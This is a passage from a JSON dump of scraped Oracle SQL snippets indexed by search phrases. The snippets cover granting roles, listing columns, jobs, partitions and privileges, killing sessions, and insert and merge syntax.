    "link": null,
    "title": " oracle grant role",
    "description": "GRANT role_name TO user_name; ALTER USER user_name DEFAULT ROLE role_name; -- Check: SELECT * FROM DBA_ROLES WHERE ROLE = 'role_name'; SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'role_name'  \tAND GRANTEE = 'user_name';\n-- CREATE ROLE role_name [IDENTIFIED BY password] [NOT IDENTIFIED] CREATE ROLE role_name; GRANT CREATE SESSION, ALTER SESSION TO role_name; GRANT SELECT, INSERT, DELETE, UPDATE ON table_name TO role_name; GRANT EXECUTE ON proc_name TO role_name; -- Grant role to user GRANT role_name TO user_name; ALTER USER user_name DEFAULT ROLE role_name; SELECT * FROM DBA_ROLES WHERE ROLE = 'role_name'; SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'role_name'  \tAND GRANTEE = 'user_name';\nGRANT role_name TO user_name;\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2803,
    "keyword": null,
    "link": null,
    "title": " oracle grant select on schema",
    "description": "BEGIN    FOR R IN (SELECT owner, table_name FROM all_tables               WHERE owner='OTHER_SCHEMA') LOOP       EXECUTE IMMEDIATE 'GRANT SELECT, INSERT, UPDATE, DELETE ON ' ||                          R.owner || '.' || R.table_name || ' TO MY_SCHEMA';    END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2804,
    "keyword": null,
    "link": null,
    "title": " oracle grants",
    "description": "-- List privileges, including roles, for my_user SELECT GRANTEE, PRIVILEGE AS PRIVILEGE_ROLE,        NULL AS OWNER, NULL AS TABLE_NAME, NULL AS COLUMN_NAME,        ADMIN_OPTION AS PRIVILEGE,         NULL AS GRANTABLE FROM DBA_SYS_PRIVS WHERE GRANTEE = 'my_user' UNION ALL SELECT r.GRANTEE, r.GRANTED_ROLE AS PRIVILEGE_ROLE, p.OWNER, p.TABLE_NAME,  \tp.COLUMN_NAME, PRIVILEGE, p.GRANTABLE FROM DBA_ROLE_PRIVS r LEFT JOIN ROLE_TAB_PRIVS p ON p.ROLE = r.GRANTED_ROLE WHERE r.GRANTEE = 'my_user';\nSELECT * FROM DBA_SYS_PRIVS WHERE GRANTEE LIKE 'FABIANO'\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2805,
    "keyword": null,
    "link": null,
    "title": " oracle high value",
    "description": "-- Sortable (by high_value) list of partitions / subpartitions in a table -- For partitions, change ALL_TAB_SUBPARTITIONS to ALL_TAB_PARTITIONS SELECT TABLE_NAME, PARTITION_NAME, SUBPARTITION_NAME, HIGH_VALUE FROM (     WITH xml_s AS (         SELECT dbms_xmlgen.getxmltype('SELECT TABLE_NAME,PARTITION_NAME,           SUBPARTITION_NAME, HIGH_VALUE            FROM ALL_TAB_SUBPARTITIONS WHERE TABLE_NAME=''MY_TABLE''            AND TABLE_OWNER=''MY_USER''') as x           FROM dual     )     SELECT xmltab.* FROM       xml_s,       xmltable(         '/ROWSET/ROW' passing xml_s.x columns           TABLE_NAME varchar2(30) path 'TABLE_NAME',           PARTITION_NAME  varchar2(30)  path 'PARTITION_NAME',           SUBPARTITION_NAME  varchar2(30)  path 'SUBPARTITION_NAME',           HIGH_VALUE varchar2(200) path 'HIGH_VALUE'       ) xmltab     ORDER BY TABLE_NAME, PARTITION_NAME, SUBPARTITION_NAME, HIGH_VALUE );\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2806,
    "keyword": null,
    "link": null,
    "title": " oracle hint dblink",
    "description": "SELECT  /*+ DRIVING_SITE(table_name) */ *     FROM table_name@dblink_name t     WHERE t.REGISTER_DATE = trunc(sysdate);\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2807,
    "keyword": null,
    "link": null,
    "title": " oracle improve dblink performance",
    "description": "SELECT  /*+ DRIVING_SITE(table_name) */ *     FROM table_name@dblink_name t     WHERE t.REGISTER_DATE = trunc(sysdate);\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2808,
    "keyword": null,
    "link": null,
    "title": " oracle index hint",
    "description": "SELECT /*+ parallel(8) full(<table_name_or_alias>) index(<table_name_or_alias> <index_name>) */...\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2809,
    "keyword": null,
    "link": null,
    "title": " oracle index partition",
    "description": "SELECT INDEX_NAME,        PARTITION_NAME,        TABLESPACE_NAME,        INITIAL_EXTENT,        NEXT_EXTENT,        PCT_INCREASE,        NUM_ROWS FROM DBA_IND_PARTITIONS WHERE INDEX_NAME = decode(upper('my_index'), 'ALL', INDEX_NAME, upper('my_index'))   AND INDEX_OWNER = upper('my_owner') ORDER BY INDEX_NAME, PARTITION_NAME;\n",
    "reg_date": "2021-10-12T09:58:20.000Z"
  },
  {
    "id": 2810,
    "keyword": null,
    "link": null,
    "title": " oracle initcap",
    "description": "SELECT INITCAP('the soap') \"Capitals\" FROM DUAL; \t-- The Soap\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2811,
    "keyword": null,
    "link": null,
    "title": " oracle inner join",
    "description": "-- Rows with ID existing in both a, b and c -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID   JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2812,
    "keyword": null,
    "link": null,
    "title": " oracle insert from select",
    "description": "INSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\nINSERT INTO table (column1, column2, ... column_n ) SELECT expression1, expression2, ... expression_n FROM source_table [WHERE conditions];  -- Basically, omit the VALUES clause when using SELECT for an insert into.\nLet&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2813,
    "keyword": null,
    "link": null,
    "title": " oracle insert into",
    "description": "INSERT INTO table (column1, column2, ... column_n ) VALUES (expression1, expression2, ... expression_n );\nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\nINSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\nINSERT INTO table (column1, column2, ... column_n ) SELECT expression1, expression2, ... expression_n FROM source_table [WHERE conditions];\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2814,
    "keyword": null,
    "link": null,
    "title": " oracle insert into where",
    "description": "INSERT INTO table (column1, column2, ... column_n ) VALUES (expression1, expression2, ... expression_n );\nINSERT INTO my_table SELECT * FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table; INSERT INTO my_table (a, b, c) SELECT a, b, c FROM source_table s \tWHERE s.my_col >= 10;\nINSERT INTO table (column1, column2, ... column_n ) SELECT expression1, expression2, ... expression_n FROM source_table [WHERE conditions];\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2815,
    "keyword": null,
    "link": null,
    "title": " oracle insert or update",
    "description": "-- Oracle: Example for Insert or update in t1 from t2 values  MERGE INTO table1 t1 USING table2 t2 ON (t1.CODE = t2.ID) WHEN MATCHED THEN     UPDATE SET t1.COL1 = t2.VALUE1 WHEN NOT MATCHED THEN     INSERT (CODE, COL1)  VALUES (t2.ID, t2.VALUE1);\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2816,
    "keyword": null,
    "link": null,
    "title": " oracle job history",
    "description": "SELECT LOG_DATE, OWNER, JOB_NAME, JOB_SUBNAME, STATUS,        ACTUAL_START_DATE, RUN_DURATION, CPU_USED, ADDITIONAL_INFO FROM ALL_SCHEDULER_JOB_RUN_DETAILS   \t-- or DBA_SCHEDULER_JOB_RUN_DETAILS WHERE JOB_NAME = 'job_name' ORDER BY LOG_DATE DESC;\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2817,
    "keyword": null,
    "link": null,
    "title": " oracle job scheduler",
    "description": "SELECT OWNER, JOB_NAME, ENABLED, JOB_CLASS, NEXT_RUN_DATE FROM DBA_SCHEDULER_JOBS WHERE OWNER NOT IN ('SYS') ORDER BY ENABLED, OWNER, JOB_NAME;  -- Running jobs: SELECT OWNER, JOB_NAME, JOB_SUBNAME, JOB_STYLE, SESSION_ID, SLAVE_PROCESS_ID,  \tELAPSED_TIME, CPU_USED  FROM DBA_SCHEDULER_RUNNING_JOBS ORDER BY OWNER, JOB_NAME;\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2818,
    "keyword": null,
    "link": null,
    "title": " oracle job session",
    "description": "-- Get Job session IDs SELECT jr.JOB, s.USERNAME, s.SID, s.SERIAL#, p.SPID, s.LOCKWAIT, s.LOGON_TIME FROM DBA_JOBS_RUNNING jr, V$SESSION s, V$PROCESS p WHERE jr.SID = s.SID AND s.PADDR = p.ADDR ORDER BY jr.JOB;\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2819,
    "keyword": null,
    "link": null,
    "title": " oracle kill job by sid",
    "description": "-- Get Job session IDs SELECT jr.JOB, s.USERNAME, s.SID, s.SERIAL#, p.SPID, s.LOCKWAIT, s.LOGON_TIME FROM DBA_JOBS_RUNNING jr, V$SESSION s, V$PROCESS p WHERE jr.SID = s.SID AND s.PADDR = p.ADDR ORDER BY jr.JOB; -- Or simply a session SELECT SID, SERIAL#, STATUS, SERVER FROM V$SESSION WHERE USERNAME = '<username>'; -- Kill session with IDs and wait for rollback if any... ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE; -- To simply stop job without killing session: BEGIN     DBMS_SCHEDULER.STOP_JOB(JOB_NAME => 'scheme.job_name', FORCE => TRUE); END;\n",
    "reg_date": "2021-10-12T09:58:21.000Z"
  },
  {
    "id": 2820,
    "keyword": null,
    "link": null,
    "title": " oracle kill session",
    "description": "-- Get ORACLE Session IDs (SID and SERIAL#) SELECT SID, SERIAL#, STATUS, SERVER FROM V$SESSION WHERE USERNAME = '<username>'; -- Kill session (and wait for rollback if any...) ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE;\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2821,
    "keyword": null,
    "link": null,
    "title": " oracle kill session by sql id",
    "description": "-- Get Job session IDs SELECT jr.JOB, s.USERNAME, s.SID, s.SERIAL#, p.SPID, s.LOCKWAIT, s.LOGON_TIME FROM DBA_JOBS_RUNNING jr, V$SESSION s, V$PROCESS p WHERE jr.SID = s.SID AND s.PADDR = p.ADDR ORDER BY jr.JOB; -- Or simply a session SELECT SID, SERIAL#, STATUS, SERVER FROM V$SESSION WHERE USERNAME = '<username>'; -- Kill session with IDs and wait for rollback if any... ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE; -- To simply stop job without killing session: BEGIN     DBMS_SCHEDULER.STOP_JOB(JOB_NAME => 'scheme.job_name', FORCE => TRUE); END;\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2822,
    "keyword": null,
    "link": null,
    "title": " oracle kill session by username",
    "description": "-- Get ORACLE Session IDs (SID and SERIAL#) SELECT SID, SERIAL#, STATUS, SERVER FROM V$SESSION WHERE USERNAME = '<username>'; -- Kill session (and wait for rollback if any...) ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE;\n-- Get Job session IDs SELECT jr.JOB, s.USERNAME, s.SID, s.SERIAL#, p.SPID, s.LOCKWAIT, s.LOGON_TIME FROM DBA_JOBS_RUNNING jr, V$SESSION s, V$PROCESS p WHERE jr.SID = s.SID AND s.PADDR = p.ADDR ORDER BY jr.JOB; -- Or simply a session SELECT SID, SERIAL#, STATUS, SERVER FROM V$SESSION WHERE USERNAME = '<username>'; -- Kill session with IDs and wait for rollback if any... ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE; -- To simply stop job without killing session: BEGIN     DBMS_SCHEDULER.STOP_JOB(JOB_NAME => 'scheme.job_name', FORCE => TRUE); END;\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2823,
    "keyword": null,
    "link": null,
    "title": " oracle last character of string",
    "description": "SELECT substr('My name is Bond', -1) FROM DUAL;\t\t-- d SELECT substr('My name is Bond', -4) FROM DUAL;\t\t-- Bond\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2824,
    "keyword": null,
    "link": null,
    "title": " oracle last day of month",
    "description": "-- Oracle: First day of previous year SELECT trunc(add_months(sysdate, -12), 'YEAR') FROM DUAL;\n-- Last day of current month SELECT trim(to_date(last_day(sysdate), 'DD/MM/YYYY')) AS LASTDAY FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2825,
    "keyword": null,
    "link": null,
    "title": " oracle leftmost characters",
    "description": "-- For Oracle only  -- syntax  SUBSTR(<main-string>,1,<number-of-characters>)  -- example  SUBSTR('Useless stuff',1,10) -- OUTPUT: Useless st  -- practical example SELECT SUBSTR('Useless stuff',1,10) FROM DUAL;\n/*Using SUBSTR in Oracle (Example from hackerrank.com): */  /*Simple select query...*/  SELECT DISTINCT city  FROM station   /*Using WHERE and SUBSTR to find (distinct) cities in station table that begin  as well as end with a vowel.*/  WHERE SUBSTR(city,1,1) IN ('A','E','I','O','U')  \tAND substr(city,-1) IN ('a','e','i','o','u');   /*Parameters for SUBSTR (Substring) in order are as follows:  String, Start, Length.*/ \n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2826,
    "keyword": null,
    "link": null,
    "title": " oracle limit rows",
    "description": "-- Oracle <= 11g  SELECT * FROM ( SELECT * FROM emp ORDER BY sal DESC ) WHERE ROWNUM <= 5; \t -- Oracle 12c + SELECT * FROM emp ORDER BY sal DESC FETCH FIRST 5 ROWS ONLY;\t\nSELECT *  FROM   sometable ORDER BY name OFFSET 20 ROWS FETCH NEXT 10 ROWS ONLY;\noracle limit rows\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2827,
    "keyword": null,
    "link": null,
    "title": " oracle limit user tablespace",
    "description": "SELECT * FROM DBA_TS_QUOTAS WHERE USERNAME='MY_USER'; ALTER USER my_user QUOTA 500M ON my_tablespace;\t\t ALTER USER my_user QUOTA UNLIMITED ON my_tablespace;\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2828,
    "keyword": null,
    "link": null,
    "title": " oracle list columns",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- User tables SELECT * FROM ALL_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- Available to user SELECT * FROM DBA_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- All schemas  -- Columns from all tables in a schema (adapt with USER_..., DBA_... or ALL_...): SELECT c.TABLE_NAME, c.DATA_TYPE FROM ALL_TAB_COLS c JOIN ALL_TABLES t ON t.OWNER = c.OWNER WHERE OWNER = 'my_schema';\nSELECT * FROM all_tab_cols;\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2829,
    "keyword": null,
    "link": null,
    "title": " oracle list columns in schema",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- User tables SELECT * FROM ALL_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- Available to user SELECT * FROM DBA_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- All schemas  -- Columns from all tables in a schema (adapt with USER_..., DBA_... or ALL_...): SELECT c.TABLE_NAME, c.DATA_TYPE FROM ALL_TAB_COLS c JOIN ALL_TABLES t ON t.OWNER = c.OWNER WHERE OWNER = 'my_schema';\nSELECT * FROM all_tab_cols;\n-- Depending on schema grants: SELECT * FROM USER_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- User tables SELECT * FROM ALL_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- Access granted SELECT * FROM DBA_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- All schemas  -- Columns from all tables in a schema (or USER_..., DBA_... instead of ALL_...): SELECT c.TABLE_NAME, c.DATA_TYPE FROM ALL_TAB_COLS c JOIN ALL_TABLES t ON t.OWNER = c.OWNER WHERE OWNER = 'my_schema';\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2830,
    "keyword": null,
    "link": null,
    "title": " oracle list columns schema",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- User tables SELECT * FROM ALL_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- Available to user SELECT * FROM DBA_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- All schemas  -- Columns from all tables in a schema (adapt with USER_..., DBA_... or ALL_...): SELECT c.TABLE_NAME, c.DATA_TYPE FROM ALL_TAB_COLS c JOIN ALL_TABLES t ON t.OWNER = c.OWNER WHERE OWNER = 'my_schema';\nSELECT * FROM all_tab_cols;\n",
    "reg_date": "2021-10-12T09:58:22.000Z"
  },
  {
    "id": 2831,
    "keyword": null,
    "link": null,
    "title": " oracle list constraints",
    "description": "SELECT * FROM ALL_CONSTRAINTS c,      ALL_CONS_COLUMNS cols WHERE c.CONSTRAINT_TYPE = 'P'   AND c.CONSTRAINT_NAME = COLS.CONSTRAINT_NAME   AND c.OWNER = COLS.OWNER   AND c.OWNER = 'schema_name'   AND cols.TABLE_NAME = 'table_name' ORDER BY cols.TABLE_NAME, COLS.POSITION;\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2832,
    "keyword": null,
    "link": null,
    "title": " oracle list data files",
    "description": "SELECT * FROM DBA_DATA_FILES WHERE TABLESPACE_NAME = 'tbs_name' ORDER BY FILE_NAME;\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2833,
    "keyword": null,
    "link": null,
    "title": " oracle list datafiles in tablespace",
    "description": "SELECT * FROM DBA_DATA_FILES WHERE TABLESPACE_NAME = 'tbs_name' ORDER BY FILE_NAME;\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2834,
    "keyword": null,
    "link": null,
    "title": " oracle list dates without weekends",
    "description": "-- All dates between 01/07/2021 and 15/07/2021 excluding weekends SELECT CAL_DATE FROM (          SELECT to_date('01/07/2021', 'DD/MM/YYYY') + ROWNUM - 1 AS CAL_DATE          FROM ALL_OBJECTS          WHERE ROWNUM <= to_date('15/07/2021', 'DD/MM/YYYY')                               - to_date('01/07/2021', 'DD/MM/YYYY') + 1) WHERE to_char(CAL_DATE, 'DY', 'NLS_DATE_LANGUAGE=AMERICAN') NOT IN ('SAT', 'SUN');\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2835,
    "keyword": null,
    "link": null,
    "title": " oracle list days between two dates",
    "description": "-- All dates between 01/01/2021 and 15/01/2021 SELECT to_date('01/01/2021', 'DD/MM/YYYY') + ROWNUM - 1 FROM ALL_OBJECTS WHERE ROWNUM <= to_date('15/01/2021', 'DD/MM/YYYY')  \t- to_date('01/01/2021', 'DD/MM/YYYY') + 1;\n  v_numvar := dt1-dt2;\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2836,
    "keyword": null,
    "link": null,
    "title": " oracle list duplicates",
    "description": "SELECT f.*,     COUNT(*) OVER (PARTITION BY fruit_name, color) c FROM fruits f;\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2837,
    "keyword": null,
    "link": null,
    "title": " oracle list functions",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM DBA_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE');\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2838,
    "keyword": null,
    "link": null,
    "title": " oracle list index on table",
    "description": "SELECT * FROM ALL_INDEXES\t\t-- or DBA_INDEXES or USER_INDEXES WHERE TABLE_NAME = 'MY_TABLE' AND OWNER = 'MY_OWNER';  -- Index columns SELECT TABLE_NAME, INDEX_NAME, COLUMN_NAME FROM DBA_IND_COLUMNS WHERE TABLE_OWNER = 'MY_OWNER' AND TABLE_NAME = 'MY_TABLE' ORDER BY TABLE_NAME, COLUMN_POSITION;\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2839,
    "keyword": null,
    "link": null,
    "title": " oracle list jobs",
    "description": "SELECT OWNER, JOB_NAME, ENABLED, JOB_CLASS, NEXT_RUN_DATE FROM DBA_SCHEDULER_JOBS WHERE OWNER NOT IN ('SYS') ORDER BY ENABLED, OWNER, JOB_NAME;  -- Running jobs: SELECT OWNER, JOB_NAME, JOB_SUBNAME, JOB_STYLE, SESSION_ID, SLAVE_PROCESS_ID,  \tELAPSED_TIME, CPU_USED  FROM DBA_SCHEDULER_RUNNING_JOBS ORDER BY OWNER, JOB_NAME;\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2840,
    "keyword": null,
    "link": null,
    "title": " oracle list of long running queries",
    "description": "SELECT SID, to_char(START_TIME, 'hh24:mi:ss') STIME, MESSAGE, (SOFAR / TOTALWORK) * 100 PERCENT FROM V$SESSION_LONGOPS WHERE SOFAR / TOTALWORK < 1;\n",
    "reg_date": "2021-10-12T09:58:23.000Z"
  },
  {
    "id": 2841,
    "keyword": null,
    "link": null,
    "title": " oracle list packages",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM DBA_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE');\n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2842,
    "keyword": null,
    "link": null,
    "title": " oracle list partitioned tables",
    "description": "SELECT * FROM ALL_TAB_PARTITIONS;\n-- List of partitioned tables SELECT DISTINCT P.TABLE_OWNER, P.TABLE_NAME, count(*) AS NB_PARTITIONS,  \tSP.NB_SUBPARTITIONS FROM DBA_TAB_PARTITIONS P LEFT JOIN (SELECT DISTINCT TABLE_OWNER, TABLE_NAME, count(*) AS NB_SUBPARTITIONS            FROM DBA_TAB_SUBPARTITIONS            GROUP BY TABLE_OWNER, TABLE_NAME, PARTITION_NAME           ) SP ON P.TABLE_OWNER = SP.TABLE_OWNER AND P.TABLE_NAME = SP.TABLE_NAME WHERE P.TABLE_OWNER NOT IN ('SYS', 'SYSTEM') GROUP BY P.TABLE_OWNER, P.TABLE_NAME, SP.NB_SUBPARTITIONS ORDER BY P.TABLE_OWNER, P.TABLE_NAME;\n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2843,
    "keyword": null,
    "link": null,
    "title": " oracle list primary key",
    "description": "-- Primary key in a table SELECT * FROM ALL_CONSTRAINTS \t\t-- or DBA_CONSTRAINTS or UESR_CONSTRAINTS WHERE TABLE_NAME= 'table_name' AND CONSTRAINT_TYPE = 'P'; -- With columns names: SELECT c.OWNER, c.TABLE_NAME, c.CONSTRAINT_NAME, c.CONSTRAINT_TYPE,  \tcol.COLUMN_NAME FROM ALL_CONSTRAINTS c JOIN ALL_CONS_COLUMNS col ON c.TABLE_NAME = col.TABLE_NAME      AND c.CONSTRAINT_NAME = col.CONSTRAINT_NAME WHERE c.TABLE_NAME= 'table_name' AND c.CONSTRAINT_TYPE = 'P' ORDER BY c.TABLE_NAME, c.CONSTRAINT_NAME, col.COLUMN_NAME;\n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2844,
    "keyword": null,
    "link": null,
    "title": " oracle list privileges",
    "description": "-- List privileges, including roles, for my_user SELECT GRANTEE, PRIVILEGE AS PRIVILEGE_ROLE,        NULL AS OWNER, NULL AS TABLE_NAME, NULL AS COLUMN_NAME,        ADMIN_OPTION AS PRIVILEGE,         NULL AS GRANTABLE FROM DBA_SYS_PRIVS WHERE GRANTEE = 'my_user' UNION ALL SELECT r.GRANTEE, r.GRANTED_ROLE AS PRIVILEGE_ROLE, p.OWNER, p.TABLE_NAME,  \tp.COLUMN_NAME, PRIVILEGE, p.GRANTABLE FROM DBA_ROLE_PRIVS r LEFT JOIN ROLE_TAB_PRIVS p ON p.ROLE = r.GRANTED_ROLE WHERE r.GRANTEE = 'my_user';\n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2845,
    "keyword": null,
    "link": null,
    "title": " oracle list procedures",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM DBA_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE');\n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2846,
    "keyword": null,
    "link": null,
    "title": " oracle list program",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE'); SELECT * FROM DBA_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE');\n-- Depending on connected user grants: SELECT * FROM ALL_SCHEDULER_PROGRAMS ORDER BY OWNER, PROGRAM_NAME; SELECT * FROM DBA_SCHEDULER_PROGRAMS WHERE OWNER = 'schema_name'; SELECT * FROM USER_SCHEDULER_PROGRAMS;\n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2847,
    "keyword": null,
    "link": null,
    "title": " oracle list proxy users",
    "description": "SELECT * FROM PROXY_USERS WHERE PROXY='MY_USER';\n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2848,
    "keyword": null,
    "link": null,
    "title": " oracle list roles",
    "description": "SELECT * FROM DBA_ROLES; SELECT * FROM DBA_ROLE_PRIVS;\n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2849,
    "keyword": null,
    "link": null,
    "title": " oracle list scheduled jobs",
    "description": "select owner as schema_name,        job_name,        job_style,        case when job_type is null                   then 'PROGRAM'             else job_type end as job_type,          case when job_type is null                  then program_name                  else job_action end as job_action,        start_date,        case when repeat_interval is null             then schedule_name             else repeat_interval end as schedule,        last_start_date,        next_run_date,        state from sys.all_scheduler_jobs order by owner,          job_name; Code has been copied\nSELECT OWNER, JOB_NAME, ENABLED, JOB_CLASS, NEXT_RUN_DATE FROM DBA_SCHEDULER_JOBS WHERE OWNER NOT IN ('SYS') ORDER BY ENABLED, OWNER, JOB_NAME;  -- Running jobs: SELECT OWNER, JOB_NAME, JOB_SUBNAME, JOB_STYLE, SESSION_ID, SLAVE_PROCESS_ID,  \tELAPSED_TIME, CPU_USED  FROM DBA_SCHEDULER_RUNNING_JOBS ORDER BY OWNER, JOB_NAME;\n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2850,
    "keyword": null,
    "link": null,
    "title": " oracle list service names",
    "description": "SELECT VALUE FROM V$PARAMETER WHERE NAME = 'service_names'; SELECT NAME FROM V$SERVICES; SELECT NAME FROM V$ACTIVE_SERVICES; SELECT * FROM ALL_SERVICES;\nselect name from V$SERVICES; select name from V$ACTIVE_SERVICES; \n",
    "reg_date": "2021-10-12T09:58:24.000Z"
  },
  {
    "id": 2851,
    "keyword": null,
    "link": null,
    "title": " oracle list tables",
